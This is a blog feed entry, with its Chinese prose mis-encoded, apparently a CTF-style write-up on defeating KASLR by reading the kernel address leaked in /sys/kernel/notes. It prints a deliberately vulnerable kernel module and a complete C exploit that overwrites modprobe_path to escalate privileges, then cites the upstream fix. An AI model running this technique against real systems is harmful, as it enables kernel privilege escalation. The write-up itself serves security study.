        <content type="html"><![CDATA[<p>é€šå¸¸æˆ‘ä»¬å¯¹å†…æ ¸çš„æ”»å‡»éƒ½æ˜¯åŸºäºçŸ¥é“å†…æ ¸å„ç§åœ°å€çš„å‰æä¸‹è¿›è¡Œçš„ï¼Œä¸ºäº†åŠ å¤§æ”»å‡»å†…æ ¸çš„éš¾åº¦ï¼Œ <code>kaslr</code> ç”±æ­¤è€Œç”Ÿï¼Œä½†å†…æ ¸ä¼šå¾ˆå®¹æ˜“æ³„éœ²æœ‰å…³å…¶ä½ç½®çš„ä¿¡æ¯ï¼Œå¦‚å¤§é‡å†…æ ¸ä»£ç ä¹äºåœ¨ <code>printk()</code> è°ƒç”¨ä¸­æ‰“å°å‡ºå†…æ ¸æŒ‡é’ˆå€¼ã€‚<br>åœ¨ å¤§é‡å·¥ä½œ ä¹‹åï¼Œé€šè¿‡ä¿®å¤å†…æ ¸ä»£ç æ¥ä½¿ç”¨é’ˆå¯¹æŒ‡é’ˆçš„ç‰¹æ®Šæ ¼å¼åŒ–æŒ‡ä»¤ï¼Œå¹¶åœ¨æœªè®¾ç½® <code>kptr_restrict</code> çš„æƒ…å†µä¸‹æ‹’ç»å°†å®é™…æŒ‡é’ˆå€¼è¾“å‡ºåˆ°æ—¥å¿—ä¸­ï¼Œä»è€ŒåŸºæœ¬è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚æ ¹æ®éœ€è¦è¿˜ä¿®æ”¹äº†å„ç§ <code>/proc</code> å’Œ <code>sysfs</code> æ–‡ä»¶ã€‚éšç€æ—¶é—´çš„æ¨ç§»ï¼Œè¦æƒ³äº†è§£ç‰¹å®šç³»ç»Ÿä¸Šçš„å†…æ ¸ä½ç½®å°±å˜å¾—æ›´åŠ å›°éš¾äº†ï¼Œä½†ä¾ç„¶æœ‰æ¼ç½‘ä¹‹é±¼å¯ä»¥ä¸ºæˆ‘ä»¬æä¾›å†…æ ¸çš„åŸºå€<br>è¿™é‡Œçš„ä¸»è§’æ˜¯ <code>/sys/kernel/notes</code> ï¼Œåœ¨è°·æ­Œä¸Šæ‰¾åˆ°çš„ååˆ†ç®€ç•¥çš„æè¿°ï¼š  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">What:/sys/kernel/notes</span><br><span class="line">Date:July 2009</span><br><span class="line">Contact:&lt;linux-kernel@vger.kernel.org&gt;</span><br><span class="line">Description:The /sys/kernel/notes file contains the binary representation</span><br><span class="line">        of the running vmlinux&#x27;s .notes section.</span><br></pre></td></tr></table></figure><p>è¯¥éƒ¨åˆ†æ˜¯åŒ…å«å†…æ ¸æ˜ åƒçš„ <code>ELF</code> æ–‡ä»¶çš„ä¸€éƒ¨åˆ†ï¼ŒåŒ…å«æœ‰å…³æ˜ åƒæœ¬èº«çš„æœ‰ç”¨ä¿¡æ¯ï¼›ä»»ä½•å†…æ ¸ä»£ç éƒ½å¯ä»¥ä½¿ç”¨ <code>ELFNOTE()</code> å®å°†æ•°æ®æ·»åŠ åˆ°æ­¤éƒ¨åˆ†ã€‚<br>æ¥ä¸‹æ¥ç›´æ¥è¿›å…¥å®è·µï¼Œç¯å¢ƒæ¥è‡ªä¸€ä¸ª <code>ret2hbp</code> çš„ <code>demo</code>  </p><ul><li><a href="https://github.com/veritas501/hbp_attack_demo">https://github.com/veritas501/hbp_attack_demo</a></li></ul><p>å¯åŠ¨å†…æ ¸åè¾“å…¥ <code>hexdump -C /sys/kernel/notes</code>  </p><img src="/2024/04/17/notes/1.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹åˆ°è¿™é‡Œç¡®å®æœ‰æˆ‘ä»¬æƒ³è¦çš„å†…æ ¸åœ°å€ï¼Œä¸ºäº†éªŒè¯è¿™ä¸ªåœ°å€æ˜¯å¦æ­£ç¡®ï¼Œæˆ‘å†³å®šç”¨è¿™ä¸ªåœ°å€æ¥æ±‚è§£è¿™ä¸€é“é¢˜ç›®<br>é¢˜ç›®æºç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;linux/printk.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/miscdevice.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;veritas&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">vuln_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">uint64_t</span> addr;</span><br><span class="line">        <span class="type">uint64_t</span> val;</span><br><span class="line">    &#125; u;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;u, (<span class="type">void</span> *)arg, <span class="keyword">sizeof</span>(u))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// write anything anywhere</span></span><br><span class="line">    <span class="comment">// pr_err(&quot;Arb Write [0x%016llx] = 0x%016llx\n&quot;, u.addr, u.val);</span></span><br><span class="line">    *(<span class="type">uint64_t</span> *)(u.addr) = u.val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">vuln_fops</span> =</span> &#123;.owner = THIS_MODULE,</span><br><span class="line">                                           .open = <span class="literal">NULL</span>,</span><br><span class="line">                                           .release = <span class="literal">NULL</span>,</span><br><span class="line">                                           .read = <span class="literal">NULL</span>,</span><br><span class="line">                                           .write = <span class="literal">NULL</span>,</span><br><span class="line">                                           .unlocked_ioctl = vuln_ioctl&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">vuln_miscdev</span> =</span> &#123;</span><br><span class="line">    .minor = MISC_DYNAMIC_MINOR, .name = <span class="string">&quot;vuln&quot;</span>, .fops = &amp;vuln_fops&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">vuln_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    pr_info(<span class="string">&quot;vuln: module init.\n&quot;</span>);</span><br><span class="line">    misc_register(&amp;vuln_miscdev);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">vuln_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    pr_info(<span class="string">&quot;vuln: module exit.\n&quot;</span>);</span><br><span class="line">    misc_deregister(&amp;vuln_miscdev);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(vuln_init);</span><br><span class="line">module_exit(vuln_exit);</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æœ‰æ— æ•°æ¬¡ä»»æ„åœ°å€å†™ <code>8</code> å­—èŠ‚çš„æœºä¼šï¼Œå‡è®¾ä¸Šé¢æ³„éœ²å‡ºæ¥çš„åœ°å€æ˜¯æ­£ç¡®çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹ <code>modprobe_path</code> æ¥è·å– <code>flag</code><br>expï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> modprobe_path = <span class="number">0xffffffff82e8b920</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="type">size_t</span> vul;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">vuln</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">void</span> <span class="title function_">arb_write</span><span class="params">(<span class="type">size_t</span> addr, <span class="type">size_t</span> vul)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">thisNote</span>;</span></span><br><span class="line">    thisNote.addr = addr;</span><br><span class="line">    thisNote.vul = vul;</span><br><span class="line">    ioctl(fd, <span class="number">0</span>, &amp;thisNote);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> leak, kernel_base;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/vuln&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> note_fd = open(<span class="string">&quot;/sys/kernel/notes&quot;</span>, O_RDONLY);</span><br><span class="line">    read(note_fd, data, <span class="number">0x100</span>);</span><br><span class="line">    binary_dump(<span class="string">&quot;/sys/kernel/notes&quot;</span>, data, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;leak, &amp;data[<span class="number">0x84</span>], <span class="number">8</span>);</span><br><span class="line">    hexx(<span class="string">&quot;leak&quot;</span>, leak);</span><br><span class="line">    kernel_base = leak - <span class="number">0x22961c0</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_base&quot;</span>, kernel_base);</span><br><span class="line">    <span class="type">size_t</span> kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_offset&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    modprobe_path += kernel_offset;</span><br><span class="line"></span><br><span class="line">    arb_write(modprobe_path, <span class="number">0x7465672f706d742f</span>);</span><br><span class="line">    arb_write(modprobe_path + <span class="number">8</span>, <span class="number">0x6c6c656873</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;# make fake file magic not found&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh\nchmod 777 /flag&#x27;&gt;/tmp/getshell&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/getshell&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27;&gt;/tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/tmp/fake&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;# get flag&quot;</span>);</span><br><span class="line">    <span class="type">int</span> flag_fd = open(<span class="string">&quot;/flag&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (flag_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open flag failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    read(flag_fd, data, <span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] flag is %s\n&quot;</span>,data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼š  </p><img src="/2024/04/17/notes/2.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æ˜¾ç„¶æ³„éœ²å‡ºæ¥çš„å†…æ ¸åœ°å€æ˜¯å¯ç”¨çš„ã€‚é€šè¿‡è°ƒè¯•å‘ç°æ³„éœ²å‡ºæ¥çš„æ˜¯ <code>startup_xen</code> çš„åœ°å€  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_XEN_PV</span></span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_VIRT_BASE,      _ASM_PTR __START_KERNEL_map)</span><br><span class="line"><span class="comment">/* Map the p2m table to a 512GB-aligned user address. */</span></span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_INIT_P2M,       .quad (PUD_SIZE * PTRS_PER_PUD))</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_ENTRY,          _ASM_PTR startup_xen)</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_FEATURES,       .ascii <span class="string">&quot;!writable_page_tables&quot;</span>)</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_PAE_MODE,       .asciz <span class="string">&quot;yes&quot;</span>)</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_L1_MFN_VALID,</span><br><span class="line">.quad _PAGE_PRESENT; .quad _PAGE_PRESENT)</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_MOD_START_PFN,  .<span class="type">long</span> <span class="number">1</span>)</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_PADDR_OFFSET,   _ASM_PTR <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>ç„¶è€Œ <code>Cook</code> å‘å¸ƒäº† <code>leaking_addresses.pl</code> çš„è¡¥ä¸ã€‚å®ƒå¯ä»¥è¯»å–å†…æ ¸ç¬¦å·æ–‡ä»¶ï¼ˆä¾‹å¦‚ <code>/proc/kallsyms</code> ï¼‰ï¼Œå¹¶æŸ¥çœ‹ä¸è¿™äº›ç¬¦å·å…³è”çš„åœ°å€æ˜¯å¦å‡ºç°åœ¨ <code>/sys/kernel/notes</code> è¿™æ ·çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ã€‚æœ‰äº†æ­¤æ›´æ”¹ä¹‹åï¼Œ <code>leaking_addresses.pl</code> å°±ä¼šå‘ç°è¿™ç§é•¿æœŸå­˜åœ¨çš„å†…æ ¸åœ°å€æ³„éœ²ï¼Œä½†æˆ‘æ„Ÿè§‰è¿˜æ˜¯ä¼šæœ‰æ¼ç½‘ä¹‹é±¼ï¼ˆç¬‘  </p><p>referenceï¼š<br><a href="https://lore.kernel.org/all/202402180028.6DB512C50@keescook/">https://lore.kernel.org/all/202402180028.6DB512C50@keescook/</a><br><a href="https://lwn.net/Articles/962782/">https://lwn.net/Articles/962782/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>llvm pass pwn</title>
      <link href="/2024/03/15/llvm/"/>
      <url>/2024/03/15/llvm/</url>
      
